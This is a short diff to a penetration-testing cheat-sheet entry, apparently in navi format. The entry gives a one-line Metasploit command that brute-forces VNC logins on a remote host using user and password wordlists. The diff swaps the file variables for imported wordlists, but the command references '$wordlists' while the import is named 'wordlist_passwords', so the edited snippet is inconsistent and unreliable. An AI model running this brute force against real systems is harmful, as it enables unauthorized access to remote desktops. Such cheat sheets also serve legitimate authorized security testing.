@@ -73,11 +73,11 @@ var user
 Run Metasploit VNC login brute force with user and password files.
 
 ```sh title:"Run VNC login brute force with wordlists"
-msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS $rhost_ip; set RPORT $rport; set USER_FILE $user_file; set PASS_FILE $pass_file; run; exit"
+msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS $rhost_ip; set RPORT $rport; set USER_FILE $wordlists_users; set PASS_FILE $wordlists; run; exit"
 ```
 <!-- cheat
+import wordlists_users
+import wordlist_passwords
 var rhost_ip
 var rport := 5900
-var user_file
-var pass_file
 -->
